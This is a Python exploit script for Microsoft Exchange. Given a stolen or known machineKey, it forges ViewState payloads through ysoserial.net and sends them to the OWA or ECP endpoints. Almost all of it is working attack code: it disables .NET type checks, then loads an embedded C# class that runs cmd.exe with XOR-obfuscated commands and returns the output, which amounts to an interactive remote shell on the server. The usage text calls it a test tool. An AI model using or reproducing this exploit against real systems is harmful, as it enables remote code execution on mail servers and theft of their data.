# Python3
import requests
import sys
import os
import urllib3
urllib3.disable_warnings()
import urllib.parse

#The version of ysoserial.net should be greater than 1.32
ysoserial_path = os.path.abspath(os.path.dirname(__file__))+"/ysoserial.net/"

def ysoserial(cmd):
    cmd = ysoserial_path+cmd
    r = os.popen(cmd)
    res = r.readlines()
    return res[-1]

def xor(str1):
    str2 = []
    for i in range(len(str1)):
        str2.append( chr( ord(str1[i]) ^ ord("x") ) )
    return ''.join(str2)

if __name__ == '__main__':
    if len(sys.argv)!=4:
        note = '''
Use to test the deserializing code execution of Exchange.            
From read and write permissions of Exchange files to deserializing code execution.
You should modify the machineKey in %ExchangeInstallPath%\\FrontEnd\\HttpProxy\\<path>\\web.config to implement deserializing code execution.
<path>:owa or ecp

Note:The version of ysoserial.net should be greater than 1.32

Usage:
    <url> <key> <path>
<path>: owa or ecp

eg.    
    {0} 192.168.1.1 CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF owa
    {1} mail.test.com CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF ecp    
        '''
        print(note.format(sys.argv[0],sys.argv[0]))
        sys.exit(0)
    else:
        targeturl = "";
        generator = "";

        shellPayload = '''
class E
{
    static string xor(string s) {
        char[] a = s.ToCharArray();
        for(int i = 0; i < a.Length; i++)
        a[i] = (char)(a[i] ^ 'x');
        return new string(a);
}

    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Form["__Value"];
            cmd = xor(cmd);        
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();            
            output = xor(output);
            context.Response.Write(output);

        } catch (System.Exception) { }
        context.Response.Flush();
        context.Response.End();
    }
}
        ''';

        try:
            if sys.argv[3] == "owa":
                targeturl = "https://" + sys.argv[1] + "/owa/auth/errorFE.aspx";
                generator = "042A94E8";

            elif sys.argv[3] == "ecp":
                targeturl = "https://" + sys.argv[1] + "/ecp/auth/TimeoutLogout.aspx";
                generator = "277B1C2A";
            else:
                print("[!] Wrong input");

            print("[*] TargetURL: " + targeturl)
   
            payload_path = "shellPayload.cs"
        
            if not os.path.exists(payload_path):
                print("[*] Trying to release " + payload_path)
                with open(payload_path,'w') as f:
                    f.write(shellPayload)

            print("[*] Trying to disable ActivitySurrogateSelectorTypeCheck")        
            payload = """ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c "ignore" --validationalg="SHA1" --validationkey="{key}" --generator="{generator}" """           
            payload = payload.format(key=sys.argv[2], generator=generator)                      
            out_payload = ysoserial(payload)
            body = {"__VIEWSTATEGENERATOR": generator,"__VIEWSTATE": out_payload}
            postData = urllib.parse.urlencode(body).encode("utf-8")

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx",
                "Content-Type":"application/x-www-form-urlencoded"
            } 
            status = requests.post(url=targeturl, headers=headers, data=postData, verify=False, timeout=15)
            print(status.status_code)

            while True:
                print("[*] Input the command:");
                command = input("Command >")

                if command == "exit":
                    sys.exit(0)

                payload = """ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "shellPayload.cs;System.Web.dll;System.dll;" --validationalg="SHA1" --validationkey="{key}" --generator="{generator}" """        
                payload = payload.format(key=sys.argv[2], generator=generator)                    
                out_payload = ysoserial(payload)

                body = {"__VIEWSTATEGENERATOR": generator,"__VIEWSTATE": out_payload,"__Value":xor(command)}
                postData = urllib.parse.urlencode(body).encode("utf-8")

                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx",
                    "Content-Type":"application/x-www-form-urlencoded"
                } 
                status = requests.post(url=targeturl, headers=headers, data=postData, verify=False, timeout=15)

                print("[*]Response code: " + str(status.status_code))                
                print(xor(status.text))

        except Exception as e:
            print("[!] Error:%s"%(e))
            sys.exit(0)
